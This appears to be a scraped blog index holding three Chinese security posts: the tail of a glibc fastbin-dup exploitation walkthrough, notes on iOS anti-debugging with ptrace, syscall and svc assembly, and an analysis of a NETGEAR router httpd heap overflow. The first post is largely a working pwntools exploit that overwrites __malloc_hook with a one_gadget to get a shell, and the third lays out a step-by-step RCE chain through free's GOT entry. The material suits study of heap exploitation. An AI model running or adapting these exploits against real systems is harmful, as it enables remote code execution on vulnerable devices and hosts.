(fast) 看来没那么简单，这里直接崩了，ummm， 看看原因： 1234567891011121314151617181920212223242526272829─────────────────────────────────[ BACKTRACE ]────────────────────────────────── ► f 0 7f7b237b604a raise+202 f 1 7f7b237b70f5 abort+357 f 2 7f7b237f7f07 __libc_message+599 f 3 7f7b237ff2aa f 4 7f7b2380235c _int_malloc+2028 f 5 7f7b23803533 malloc+51 f 6 400976 main+431 f 7 7f7b237a2037 __libc_start_main+231────────────────────────────────────────────────────────────────────────────────pwndbg&gt; f 4#4 0x00007f7b2380235c in _int_malloc (av=av@entry=0x7f7b23b34b60 &lt;main_arena&gt;, bytes=bytes@entry=104) at malloc.c:35943594 malloc_printerr (&quot;malloc(): memory corruption (fast)&quot;);pwndbg&gt; context codeLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA───────────────────────────────[ SOURCE (CODE) ]────────────────────────────────In file: /home/x/.glibc/glibc_2.30_no-tcache/malloc/malloc.c 3589 REMOVE_FB (fb, pp, victim); 3590 if (__glibc_likely (victim != NULL)) 3591 { 3592 size_t victim_idx = fastbin_index (chunksize (victim)); 3593 if (__builtin_expect (victim_idx != idx, 0)) ► 3594 malloc_printerr (&quot;malloc(): memory corruption (fast)&quot;); 3595 check_remalloced_chunk (av, victim, nb); 3596 #if USE_TCACHE 3597 /* While we're here, if we see other chunks of the same size, 3598 stash them in the tcache. */ 3599 size_t tc_idx = csize2tidx (nb);──────────────────────────────────────────────────────────────────────────────── 根据backtrace看到是在_int_malloc 的时候出问题的，根据代码来看，3592 行是在获取当前chunk的size然后判断是在fastbins中的第几个bin， 3593行则是判断当前的使用的bin和size所在的bin是否为同一个，如果不是则提示错误。 如此看来，错误应该是user这个fake bin 中表示size的字段不在0x60—0x70之间，根据上面看的user结构：两个长度为16的char数组，我们可以自己控制user.username [8:15]，将其设置成0x70bin的长度即可: 12345678910111213141516171819202122232425262728293031io.sendafter(&quot;username: &quot;, p64(0) + p64(0x71))io.recvuntil(&quot;&gt; &quot;)chunk_A = malloc(0x68, &quot;A&quot;*0x68)chunk_B = malloc(0x68, &quot;B&quot;*0x68)input(&quot;after malloc&quot;)free(chunk_A)free(chunk_B)input(&quot;after free normal&quot;)free(chunk_A)input (&quot;after double free&quot;)dup=malloc(0x68, p64(elf.sym.user))input(&quot;malloc for user addr&quot;)malloc(0x68,&quot;C&quot;*0x68)malloc(0x68,&quot;D&quot;*0x68)malloc(0x68,&quot;arbitrary write&quot;)---pwndbg&gt; p user$1 = { username = &quot;\\000\\000\\000\\000\\000\\000\\000\\000q\\000\\000\\000\\000\\000\\000&quot;, target = &quot;XXXXXXX\\000\\000\\000\\000\\000\\000\\000\\000&quot;}pwndbg&gt; cContinuing.^Cpwndbg&gt; p user$2 = { username = &quot;\\000\\000\\000\\000\\000\\000\\000\\000q\\000\\000\\000\\000\\000\\000&quot;, target = &quot;arbitrary write&quot;} 至此一个任意地址写已经实现了，下面就看一下如何实现RCE， 常规思路是通过任意写修改GOT表中malloc 或free对应的地址，改成system项尔后再填入参数调用。这里记一种新学到的招式： 在glibc中，提供了_malloc_hook 以及_free_hook，在调用malloc或free时，如果对应的hook值存在，则会先调用_malloc_hook或_free_hook指向的地址。既然如此，我们便可以overwrite 对应的地址，这样就可以直接让glibc帮我们来调用。overwrite的内容可以通过one_gadget 寻找glibc中的execve(“/bin/sh”…)，只要满足条件就可以用。 下面详细来讲： 1234567891011121314151617181920212223242526pwndbg&gt; ptype __malloc_hooktype = void *(*)(size_t, const void *)pwndbg&gt; ptype __free_hooktype = void (*)(void *, const void *)pwndbg&gt; dq &amp;__malloc_hook 2000007f6d768d3b50 0000000000000000 000000000000000000007f6d768d3b60 0000000000000000 000000000000000000007f6d768d3b70 0000000000000000 000000000000000000007f6d768d3b80 0000000000000000 000000000000000000007f6d768d3b90 0000000000000000 000000000000000000007f6d768d3ba0 0000000000000000 000000000000000000007f6d768d3bb0 0000000000000000 000000000000000000007f6d768d3bc0 000000000259d0e0 000000000000000000007f6d768d3bd0 00007f6d768d3bc0 00007f6d768d3bc000007f6d768d3be0 00007f6d768d3bd0 00007f6d768d3bd0pwndbg&gt; dq &amp;__free_hook 2000007f6d768d5e20 0000000000000000 000000000000000000007f6d768d5e30 0000000000000000 000000000000000000007f6d768d5e40 0000000000000000 000000000000000000007f6d768d5e50 0000000000000000 000000000000000000007f6d768d5e60 0000000000000000 000000000000000000007f6d768d5e70 0000000000000000 000000000000008000007f6d768d5e80 0000000000000000 000000000000000000007f6d768d5e90 0000000000000000 000000000000000000007f6d768d5ea0 0000000000000000 000000000000000000007f6d768d5eb0 0000000000000000 0000000000000000 看了__malloc_hook 和__free_hook，发现一个问题，如果把他们当作一个fake chunk，表示size的字段都是0，必然无法通过_int_malloc中的check，同时这里也不像user结构那样可以被我们控制。既然如此，那我们就向前找找，只要表示size的字段合适且能覆盖到_malloc_hook 或_free_hook就可以。这里可以借助pwndbg的find_fake_fast命令： 12345678910111213141516171819202122232425262728pwndbg&gt; find_fake_fast --helpusage: find_fake_fast [-h] addr [size]Find candidate fake fast chunks overlapping the specified address.positional arguments: addr Address of the word-sized value to overlap. size Size of fake chunks to find.optional arguments: -h, --help show this help message and exitpwndbg&gt; find_fake_fast &amp;__malloc_hook FAKE CHUNKSFake chunk | Allocated chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENAAddr: 0x7f6d768d3b2dprev_size: 0x6d768cfee0000000size: 0x7ffd: 0x6d765a2a10000000bk: 0x6d765a2ed000007ffd_nextsize: 0x7fbk_nextsize: 0x00pwndbg&gt; find_fake_fast &amp;__free_hookFAKE CHUNKSpwndbg&gt; p &amp;__malloc_hook$1 = (void *(**)(size_t, const void *)) 0x7f6d768d3b50 &lt;__malloc_hook&gt;p/x 0x7f6d768d3b50-0x7f6d768d3b2d-0x10 #malloc data字段在size之后$3 = 0x13 在__malloc_hook 前成功找到一个可以充当fake fast chunk 的地址而__free_hook前则没找到合适的。如此我们在找到的地址上填充p8(any_num)*0x13+p64(cmd)即可。下面通过one_gadget查找libc.so中的execve(“/bin/sh”…) 123456789101112131415161718➜ ldd fastbin_dup linux-vdso.so.1 (0x00007ffc21493000) libc.so.6 =&gt; ../.glibc/glibc_2.30_no-tcache/libc.so.6 (0x00007ffa81a8000) ../.glibc/glibc_2.30_no-tcache/ld.so.2 =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007ffae8564000)➜ one_gadget ../.glibc/glibc_2.30_no-tcache/libc.so.60xc4dbf execve(&quot;/bin/sh&quot;, r13, r12)constraints: [r13] == NULL || r13 == NULL [r12] == NULL || r12 == NULL0xe1fa1 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xe1fad execve(&quot;/bin/sh&quot;, rsi, [rax])constraints: [rsi] == NULL || rsi == NULL [[rax]] == NULL || [rax] == NULL 找到三个可以执行shell的，三个都有限制条件，对应constraints字段显示的内容。那就只能是一个一个试试看了，这里将对应的地址改成0xdeadbeef，这样在malloc走到这里时会直接跳到调试器中： 1234567891011121314151617181920212223242526272829LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA─────────────────────────────────[ REGISTERS ]────────────────────────────────── RAX 0xdeadbeef RBX 0x0 RCX 0x0 RDX 0xffffffffffffff98 RDI 0x68 RSI 0x400976 (main+431) ◂— mov rdx, rax R8 0x7fff71d631f3 ◂— 0x0 R9 0x0 R10 0x7fcc3ff00720 (_nl_C_LC_CTYPE_toupper+512) ◂— add byte ptr [rax], al R11 0xa R12 0x4006e0 (_start) ◂— xor ebp, ebp R13 0x7fff71d63370 ◂— 0x1 R14 0x0 R15 0x0 RBP 0x7fff71d63290 —▸ 0x400ae0 (__libc_csu_init) ◂— push r15 RSP 0x7fff71d63228 —▸ 0x400976 (main+431) ◂— mov rdx, rax RIP 0xdeadbeef───────────────────────────────────[ DISASM ]───────────────────────────────────Invalid address 0xdeadbeef───────────────────────────────────[ STACK ]────────────────────────────────────...─────────────────────────────────[ BACKTRACE ]────────────────────────────────── ► f 0 deadbeef f 1 400976 main+431 f 2 7fcc3fdbd037 __libc_start_main+231──────────────────────────────────────────────────────────────────────────────── 可以看到r12 和 r13寄存器都不是空，且对应地址都不为空，所以第一个gadget不能满足条件。看下第二个，要求[rsp+0x50]为null，那就看下stack 12345678910111213141516pwndbg&gt; stack 1500:0000│ rsp 0x7fff71d63228 —▸ 0x400976 (main+431) ◂— mov rdx, rax01:0008│ 0x7fff71d63230 —▸ 0x7fff71d63378 —▸ 0x7fff71d64302 ◂— '/home/x/fastbin_dup/fastbin_dup'02:0010│ 0x7fff71d63238 ◂— 0x171d6326e03:0018│ 0x7fff71d63240 ◂— 0x60000000104:0020│ 0x7fff71d63248 ◂— 0x68 /* 'h' */05:0028│ 0x7fff71d63250 —▸ 0x23bc010 —▸ 0x7fcc4014fb41 (__memalign_hook+1) ◂— 0x4141414141414141 ('AAAAAAAA')06:0030│ 0x7fff71d63258 —▸ 0x23bc080 —▸ 0x23bc041 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAq'07:0038│ 0x7fff71d63260 —▸ 0x23bc010 —▸ 0x7fcc4014fb41 (__memalign_hook+1) ◂— 0x4141414141414141 ('AAAAAAAA')08:0040│ 0x7fff71d63268 —▸ 0x23bc080 —▸ 0x23bc041 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAq'09:0048│ 0x7fff71d63270 —▸ 0x23bc010 —▸ 0x7fcc4014fb41 (__memalign_hook+1) ◂— 0x4141414141414141 ('AAAAAAAA')0a:0050│ 0x7fff71d63278 —▸ 0x7fcc4014fb3d ◂— 0x4141414141414141 ('AAAAAAAA')0b:0058│ 0x7fff71d63280 ◂— 0x00c:0060│ 0x7fff71d63288 ◂— 0x755c2feb7db26d000d:0068│ rbp 0x7fff71d63290 —▸ 0x400ae0 (__libc_csu_init) ◂— push r150e:0070│ 0x7fff71d63298 —▸ 0x7fcc3fdbd037 (__libc_start_main+231) ◂— mov edi, eax ok，可以看到虽然当前[rsp+0x50]不为空，但是 rsp+50 指向的是我们可以控制的字符，那么就可以手动将其设置成0，如此第二个就满足条件了，wink~ 123456789101112131415161718192021222324252627282930# =============================================================================io.sendafter(&quot;username: &quot;, p64(0) + p64(0x71))# io.sendafter(&quot;username: &quot;, &quot;FastbinDup&quot;)io.recvuntil(&quot;&gt; &quot;)chunk_A = malloc(0x68, &quot;A&quot;*0x68)chunk_B = malloc(0x68, &quot;B&quot;*0x68)input(&quot;after malloc&quot;)free(chunk_A)free(chunk_B)input(&quot;after free normal&quot;)free(chunk_A)input (&quot;after double free&quot;)# dup=malloc(0x68, p64(elf.sym.user))dup = malloc(0x68, p64(libc.sym.__malloc_hook-0x23))input(&quot;malloc for user addr&quot;)malloc(0x68,&quot;C&quot;*0x68)malloc(0x68,&quot;D&quot;*0x68)# malloc(0x68,&quot;arbitrary write&quot;)# malloc(0x68, p64(libc.sym.system))malloc(0x68, p8(0)*19+p64(libc.address + 0xe1fa1))malloc(0x68, &quot;&quot;)print (&quot;enjoy~&quot;)# =============================================================================io.interactive() 1234567891011121314151617181920212223x@ubuntu  python3 RCE_Fastbin_Dup.py[*] '/home/x/fastbin_dup/fastbin_dup' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'../.glibc/glibc_2.30_no-tcache'[*] '/home/x/.glibc/glibc_2.30_no-tcache/libc-2.30.so' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] Starting local process '/home/x/fastbin_dup/fastbin_dup': pid 13618after mallocafter free normalafter double freemalloc for user addrenjoy~[*] Switching to interactive mode$ iduid=1000(x) gid=1000(x) groups=1000(x),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare) 小结 Fastbin Dup 就是通过double free修改fd指针，将fake fast bin 链入当前的链表中，之后再分配到对应地址 fastbin 的double free 检查只检查当前链入的块是否是第一个，不是则ok 在分配fastbin出去时，会检查当前chunk中表示size的字段与当前bin所在的大小是否一致，不符合则报错，所以size字段需要符合条件 利用时__malloc_hook是一个很好的目标，通过find_fake_fast找到符合条件的地址，之后覆盖_malloc_hook为对应的地址即可，one_gadget 可以用于在glibc的so文件中查找”/bin/sh”","link":"/2020/12/28/glibc%E5%88%A9%E7%94%A8%E4%B9%8BFastbinDup/"},{"title":"小记iOS反调试","text":"前段时间在看雪上发了篇bypass反调试的笔记 ， 之后有不少人私信我反调试相关问题，不乏一些比较尖锐的问题把我也问懵了。后来反思了一下，虽然我跟大哥们学会了不少骚操作，但是没有自己系统的整理过，经常是根据问题去现找…. 屏蔽调试器的方式ptrace：是unix 系统中的一种系统调用，它提供了一个进程可以控制另一个进程运行的方法，并且可以修改被控制进程的内存和寄存器，主要用于调试和系统调用追踪。函数原型如下： 123456NAME ptrace - process traceSYNOPSIS #include &lt;sys/ptrace.h&gt; long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data); request代表请求类型,pid代表被调试进程的pid，常用的有： PTRACE_TRACEME：表示将被调试进程跟踪，对于每个进程，PTRACE_TRACEME只能被调用一次 PTRACE_ATTACH：attach到pid进程上，相当于pid进程执行了PTRACE_TRACEME PTRACE_SYSCALL：使被调试进程继续运行,但是在下一个系统调用的入口处或出口处停下,或者是执行完一条指令后停下. 这里根据ptrace的特性，每个进程都只能被PTRACE_TRACEME一次，所以在程序的开始位置主动执行ptrace(PTRACE_TRACEME,0,0,0)后，其它进程就没办法再attach上了。 由于ptrace是系统调用，所以除了直接通过api的方式调用外，还可以通过其它方式来调用。提起系统调用自然就会想到用syscall来调: 在用户空间和内核空间之间，有一个叫做Syscall(系统调用, system call)的中间层，是连接用户态和内核态的桥梁。这样即提高了内核的安全型，也便于移植，只需实现同一套接口即可。Linux系统，用户空间通过向内核空间发出Syscall，产生软中断，从而让程序陷入内核态，执行相应的操作。对于每个系统调用都会有一个对应的系统调用号，比很多操作系统要少很多。 1234567NAME top syscall - indirect system callSYNOPSIS top #include &lt;sys/syscall.h&gt; /* Definition of SYS_* constants */ #include &lt;unistd.h&gt; long syscall(long number, ...); 使用syscall调用ptrace也就是 syscall(SYS_ptrace, PT_DENY_ATTACH, 0, 0, 0) 除了这种方式还可以通过svc调用来实现，看网上很多文章都有写用svc但是少有写svc是什么的。SVC指令在ARM体系中被归于异常处理类指令，该指令能允许用户程序调用内核，其格式如下： 1SVC{cond} #imm // Supervisor call, allows application program to call the kernel (EL1) 与传统arm中使用svc 0 表示中断不一样，xnu中使用的是svc 0x80 123456789101112131415//xnu-3789.41.3/bsd/kern/syscall.h#define SYS_ptrace 26//https://github.com/apple/darwin-xnu/blob/8f02f2a044b9bb1ad951987ef5bab20ec9486310/osfmk/mach/arm/vm_param.h#define SWI_SYSCALL 0x80//https://github.com/apple/darwin-xnu/blob/8f02f2a044b9bb1ad951987ef5bab20ec9486310/libsyscall/custom/SYS.h#define DO_SYSCALL(num, cerror) \\ mov x16, #(num) %%\\ svc #SWI_SYSCALL %%\\ b.cc 2f %%\\ ARM64_STACK_PROLOG %%\\ PUSH_FRAME %%\\ bl _##cerror %%\\ POP_FRAME %%\\ ARM64_STACK_EPILOG %%\\ 可以看到，系统调用号传给x16寄存器，然后指定svc 0x80来执行系统调用。所以上面的直接调用ptrace 和通过syscall调用ptrace也可以转成： 1234567891011121314151617181920//ptrace(0x31,0,0,0)#ifdef __arm64__ __asm__(&quot;mov X0, #31\\n&quot; &quot;mov X1, #0\\n&quot; &quot;mov X2, #0\\n&quot; &quot;mov X3, #0\\n&quot; &quot;mov w16, #26\\n&quot; &quot;svc #0x80&quot;);#endif//syscall(SYS_ptrace, PT_DENY_ATTACH, 0, 0, 0)#ifdef __arm64__ __asm__(&quot;mov X0, #26\\n&quot; &quot;mov X1, #31\\n&quot; &quot;mov X2, #0\\n&quot; &quot;mov X3, #0\\n&quot; &quot;mov X4, #0\\n&quot; &quot;mov w16, #0\\n&quot; &quot;svc #0x80&quot;);#endif 基于特征去检测的方式检测的方式相对于屏蔽调试器来说就多了许多： sysctl： 当一个进程被调试的时候，该进程会有一个标记来标记自己正在被调试，所以可以通过sysctl去查看当前进程的信息，看有没有这个标记位即可检查当前调试状态。 1234567891011121314151617181920212223#import &lt;sys/sysctl.h&gt;#import &lt;sys/types.h&gt;#import &lt;unistd.h&gt;//int sysctl(int *, u_int, void *, size_t *, void *, size_t);bool debug_sysctl(){ int name[4];//存放字节码，查询信息 struct kinfo_proc info;//接受进程查询结果信息的结构体 size_t info_size = sizeof(info);//结构体的大小 info.kp_proc.p_flag = 0; name[0] = CTL_KERN;//内核查看 name[1] = KERN_PROC;//进程查看 name[2] = KERN_PROC_PID;//进程ID name[3] = getpid();//获取pid，据说这个可以直接传0? int proc_err = sysctl(name, 4, &amp;info, &amp;info_size, NULL, 0); if (proc_err == -1) { //判断是否出现了异常 exit(-1); } //info.kp_proc.p_flag中存放的是标志位（二进制），在proc.h文件中有p_flag的宏定义，通过&amp;运算可知对应标志位的值是否为0。（若结果值为0则对应标志位为0）。其中P_TRACED为正在跟踪调试过程。 return ((info.kp_proc.p_flag &amp; P_TRACED) != 0);} isatty：测试标准输出文件描述符是否指向终端，当被调试的时候这点无疑 1234#import &lt;unistd.h&gt;if (isatty(1)) { exit(0); } ioctl：通过测试标准输出文件描述符的窗口大小，如果为0则可能是在被调试 12345#import &lt;sys/ioctl.h&gt;if (!ioctl(1, TIOCGWINSZ)) { exit(1);} 这种基于检测方式反调试的，一般人的操作是检测到了后直接退出。但是退出这个也太明显了，很容易作为特征被分析出来。可以尝试的是通过svc调用后破坏堆栈，或者是直接将状态上传，然后在程序运行时结合其它暗桩去做处理，具体还是得根据业务逻辑来做。比如某看app检测到处于越狱环境中时，客户端可以拿到server的数据，但是客户端中的一切行为都不会影响到server中的数据，类比思路~ 这里还要提一点，在分析的时候看到很多人有反调试的意识，但是都是在主程序的start中调用的，这样会有个问题，使用api的时候很容易就可以hook然后修改流程。所以这里我们最好是将反调试操作放在动态库中，因为自己的动态库要早于注入的动态库被加载，所以可一定程度防止被hook。这里还是要借用李斌同学的图来解释一下dyld的加载流程： 所以在做反调试的时候，可以尝试在动态库中使用汇编形式的多种手法混合使用，甚至是直接抠出内联汇编的硬编码，然后使用shellcode的方式去调用，具体可以参照我分析zoom的那篇文章中的部分。然后检测调试状态的可以在多处使用，检测到结果后灵活处理。 Linux ptrace详细分析系列 反调试及绕过 Dobby iOS 逆向 - 应用安全攻防(越狱与非越狱) iOS 底层 - 从头梳理 dyld 加载流程","link":"/2021/07/11/%E5%B0%8F%E8%AE%B0iOS%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"title":"小记一则不一样的Fastbin利用","text":"在翻ZDI的历史博客时，看到一个NETGEAR路由器中的堆溢出利用，很是少见，一般路由器中大多是命令执行或栈溢出，很少见到有堆溢出相关的，便跟着走了一遍。 漏洞点及成因漏洞在现在看来其实很无厘头，在文件上传逻辑中获取Content-Length值时通过对整个http的请求做stristr(s1, “Content-Length: “)来定位的，且没有其他的条件限制。 1234567.text:00017308 04 A0 80 E2 ADD R10, R0, #4.text:0001730C A4 17 1F E5 LDR R1, =aContentLength_0 ; &quot;Content-Length: &quot;.text:00017310 04 00 A0 E1 MOV R0, R4.text:00017314 0A 80 64 E0 RSB R8, R4, R10.text:00017318 E7 DA FF EB BL stristr.text:0001731C 00 90 50 E2 SUBS R9, R0, #0.text:00017320 B3 00 00 0A BEQ loc_175F4 所以attacker在请求头中原Content-Length之前如果包含了伪造的字段，即可控制该值。这个值的计算逻辑也很有意思： 1234567v117 = stristr(v115 + 16, &quot;\\r\\n&quot;) - (v115 + 16);fileSize1 = 0;for ( i = 0; i &lt; v117; ++i ){ _chr = *(char *)++v116; fileSize1 = _chr - '0' + 10 * fileSize1;} 可以看到是以\\r\\n作为结束符，在结束符之前的都将作为数字的str，计算时将每个字符的ascii减去0的ascii，然后组合到一起作为实际值来使用。这里的fileSize1是unsigned int，所以这里必然存在整数溢出问题。这个fileSize值在后面用作内存分配的值，申请fileSize的空间后再将上传的内存拷贝至对应位置。 所以在控制了fileSize值后，将其改成比上传内容实际值小便可以触发堆溢出的问题。 1234567891011if ( dword_1A870C ){ free((void *)dword_1A870C); dword_1A870C = 0;}...dword_1A870C = (int)malloc(fileSize1 + 0x258);...memset((void *)dword_1A870C, 32, fileSize1 + 0x258);v208 = v89 - v102;memcpy((void *)dword_1A870C, &amp;s1[v102], v89 - v102); 漏洞的成因大致就是这样，我觉得完全是开发人员不严谨导致的；另一方面也是早起嵌入式开发人员习惯什么事情都自己来完成，所以解析字段时也就直接stristr去获取了，却没做严格的限制。同时在计算数字时也没有考虑到存在非数字字符的情况。 如何利用利用部分主要记录的是堆相关的操作，至于路径选择以及其它跟路由器密切相关的部分这里就不记录了，感兴趣的可以去看原blog。 1234567➜ checksec httpd[*] '/tftpboot/httpd'Arch: arm-32-littleRELRO: No RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8000) 不存在PIE所以我们不用考虑如何去获取heap base，把重点放在堆相关的利用上即可。现在有一个堆溢出且能将任意数据写入堆内存，常规思路有： 通过溢出直接覆盖后面堆块的链表指针去控制后面的堆分配，然覆盖got表… 溢出覆盖__malloc_hook、__free_hook的值，将其修改成gadget… 但是很可惜，这里这两种方式都不大行得通。由于固件中使用的是uClibc，属于glibc的最小libc版本，所以其中并没有__malloc_hook这种机制，所以方法二彻底废了，方法一行不通是因为漏洞点前后有其它因素影响： 溢出点分配的内存会存储在全局变量中，每次使用前会检查全局变量中是否有内容，有的话则先free对应内存将全局变量置0再分配 memcpy拷贝内容触发堆溢出后，会返回错误页面，在这里会调用fopen函数，而在uClibc中fopen会触发两次内存操作，大小分别为0x60和0x1000，大致流程为： 1free(malloc(0x60)), free(malloc(0x1000)) 看到0x60的时候很自然会想到fastbinDup，但是后面这个0x1000就让人头疼了，会触发malloc_consolidate来整理fastbin。这里简单介绍一下malloc_consolidate: 这个函数的作用就是将 fastbin 合并后置入 unsorted bin，一般调用的情况有以下几种： malloc malloc 的大小在 smallbin 范围内，若对应的 smallbin 没初始化的时候。 当申请大于 small bin 范围的堆快时（large chunk） **if (have_fastchunks(av)) **malloc_consolidate(av); 投 topchunk 中没有空闲内存，向系统申请内存时，如果 fastbin 中有空间，则会先尝试整理 fastbin 看能否满足需求，不行再从 system 中申请 free free 一块大内存后会合并其附近的空闲内存，如果合并后的 size 大于 FASTBIN_CONSOLIDATION_THRESHOLD 时，如果有 fastbins 则会调用 malloc_consolidate, 同时如果 top chunk 的 size 大于 trim_threshold，会向操作系统归还内存，也会调用 malloc_consolidate. 由于malloc_consolidate整理了fastbin，所以我们不能用fastbinDup，但是又没用其它更好的办法，似乎无解了。 这里的破局之法还是出现在uClibc中，毕竟是最小版本的glibc，所以其中很多实现都不怎么完善。uClibc中的free 和malloc与glibc中还是有比较大的不同，其中在释放fastbin时存在越界写问题： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164struct malloc_state {/* The maximum chunk size to be eligible for fastbin */size_t max_fast; /* low 2 bits used as flags *//* Fastbins */mfastbinptr fastbins[NFASTBINS];/* Base of the topmost chunk -- not otherwise kept in a bin */mchunkptr top;/* The remainder from the most recent split of a small request */mchunkptr last_remainder;/* Normal bins packed as described above */mchunkptr bins[NBINS * 2];/* Bitmap of bins. Trailing zero map handles cases of largest binned size */unsigned int binmap[BINMAPSIZE+1];/* Tunable parameters */...};/* ------------------------------ malloc ------------------------------ */void* malloc(size_t bytes){size_t nb; /* normalized request size */...av = get_malloc_state();/*Convert request size to internal form by adding (sizeof(size_t)) bytesoverhead plus possibly more to obtain necessary alignment and/orto obtain a size of at least MINSIZE, the smallest allocatablesize. Also, checked_request2size traps (returning 0) request sizesthat are so large that they wrap around zero when padded andaligned.*/checked_request2size(bytes, nb);/*Bypass search if no frees yet*/if (!have_anychunks(av)) {if (av-&gt;max_fast == 0) /* initialization check */__malloc_consolidate(av);goto use_top;}/*If the size qualifies as a fastbin, first check corresponding bin.*/.../* If this is a large request, consolidate fastbins before continuing.While it might look excessive to kill all fastbins beforeeven seeing if there is space available, this avoidsfragmentation problems normally associated with fastbins.Also, in practice, programs tend to have runs of either small orlarge requests, but less often mixtures, so consolidation is notinvoked all that often in most programs. And the programs thatit is called frequently in otherwise tend to fragment.*/else {idx = __malloc_largebin_index(nb);if (have_fastchunks(av))__malloc_consolidate(av);}...}#define ANYCHUNKS_BIT (1U)#define have_anychunks(M) (((M)-&gt;max_fast &amp; ANYCHUNKS_BIT))#define have_fastchunks(M) (((M)-&gt;max_fast &amp; FASTCHUNKS_BIT))#define fastbin_index(sz) ((((unsigned int)(sz)) &gt;&gt; 3) -2)/* ------------------------------ free ------------------------------ */void free(void* mem){ mstate av; mchunkptr p; /* chunk corresponding to mem */ size_t size; /* its size */ mfastbinptr* fb; /* associated fastbin */ mchunkptr nextchunk; /* next contiguous chunk */ size_t nextsize; /* its size */ int nextinuse; /* true if nextchunk is used */ size_t prevsize; /* size of previous contiguous chunk */ mchunkptr bck; /* misc temp for linking */ mchunkptr fwd; /* misc temp for linking */ /* free(0) has no effect */ if (mem == NULL) return; __MALLOC_LOCK; av = get_malloc_state(); p = mem2chunk(mem); size = chunksize(p); check_inuse_chunk(p); /* If eligible, place chunk on a fastbin so it can be found and used quickly in malloc. */ if ((unsigned long)(size) &lt;= (unsigned long)(av-&gt;max_fast)#if TRIM_FASTBINS /* If TRIM_FASTBINS set, don't place chunks bordering top into fastbins */ &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)#endif ) { set_fastchunks(av); fb = &amp;(av-&gt;fastbins[fastbin_index(size)]); /// &lt;--------- OOB p-&gt;fd = *fb; *fb = p; } /* Consolidate other non-mmapped chunks as they arrive. */ else if (!chunk_is_mmapped(p)) { set_anychunks(av); nextchunk = chunk_at_offset(p, size); nextsize = chunksize(nextchunk); ... /* If freeing a large space, consolidate possibly-surrounding chunks. Then, if the total unused topmost memory exceeds trim threshold, ask malloc_trim to reduce top. Unless max_fast is 0, we don't know if there are fastbins bordering top, so we cannot tell for sure whether threshold has been reached unless fastbins are consolidated. But we don't want to consolidate on each free. As a compromise, consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD is reached. */ if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) { if (have_fastchunks(av)) __malloc_consolidate(av); if ((unsigned long)(chunksize(av-&gt;top)) &gt;= (unsigned long)(av-&gt;trim_threshold)) __malloc_trim(av-&gt;top_pad, av); } } /* If the chunk was allocated via mmap, release via munmap() Note that if HAVE_MMAP is false but chunk_is_mmapped is true, then user must have overwritten memory. There's nothing we can do to catch this error unless DEBUG is set, in which case check_inuse_chunk (above) will have triggered error. */ else { size_t offset = p-&gt;prev_size; av-&gt;n_mmaps--; av-&gt;mmapped_mem -= (size + offset); munmap((char*)p - offset, size + offset); } __MALLOC_UNLOCK;} 可以看到在访问fastbins数组时没有边界检查，而fastbins在malloc_state中位于max_fast之后，同时max_fast又是是否执行malloc_consolidate的判断条件，所以只要通过fastbins的越界写来修改max_fast，便可以控制malloc_consolidate让malloc中不整理fastbin，这样我们就可以使用fastbinDup来完成利用了。 控制max_fast的方法也比较好理解，根据fastbin_index可以看到我们只需要将设置成7或8时，index为-1，就可以访问到max_fast。sz又是堆块中表示size的字段，可以通过堆溢出去覆盖修改，所以修改max_fast也就不是问题了。 最后利用流程如下： 通过触发堆溢出漏洞修改下一个堆快的flag，覆盖REV_INUSE标志为0，使其错误地表示前一个chunk是空闲的； 由于错误的PREV_INUSE标志，我们可以malloc()返回一个与实际存在的块重叠的块。因此我们可以修改上一个堆快的size设置为不可能的 8； 当释放这个”size = 8”的堆快后并放置在fastbin 上时，malloc_stats-&gt;max_fast会被改成一个大值（堆快的地址） 当malloc_stats-&gt;max_fast被更改后，malloc(0x1000)便不会再调用malloc_consolidate，所以就可以使用fastbinDup了 再次触发堆溢出漏洞，溢出修改下一个空闲块的fd为free()的GOT地址 再次申请堆快，会返回free的GOT地址，我们可以向其中写入system 的plt地址 最后，在调用free的时候，会调用system，我们可以将其参数指向payload，从而实现RCE 小结这里比较精巧的就是利用uClibc中free函数存在的OOB，是的可以控制malloc_consolidate是否被执行。后面对这个原语搜了一波，发现还有挺多利用中都有用到，是我愚钝了(lll￢ω￢) 在嵌入式设备中，除了常规的程序发掘外，对于一些使用的库也存在很多漏洞。有时候结合这些库中存在的问题可能会得到意想不到的结果。","link":"/2020/12/28/%E5%B0%8F%E8%AE%B0%E4%B8%80%E5%88%99%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84Fastbin%E5%88%A9%E7%94%A8/"}],"tags":[{"name":"Netgear","slug":"Netgear","link":"/tags/Netgear/"},{"name":"iot","slug":"iot","link":"/tags/iot/"},{"name":"router","slug":"router","link":"/tags/router/"},{"name":"iOS","slug":"iOS","link":"/tags/iOS/"},{"name":"QEMU","slug":"QEMU","link":"/tags/QEMU/"},{"name":"Bin","slug":"Bin","link":"/tags/Bin/"},{"name":"Security","slug":"Security","link":"/tags/Security/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"Router","slug":"Router","link":"/tags/Router/"},{"name":"NETGEAR","slug":"NETGEAR","link":"/tags/NETGEAR/"}],"categories":[{"name":"IOT","slug":"IOT","link":"/categories/IOT/"},{"name":"iOS","slug":"iOS","link":"/categories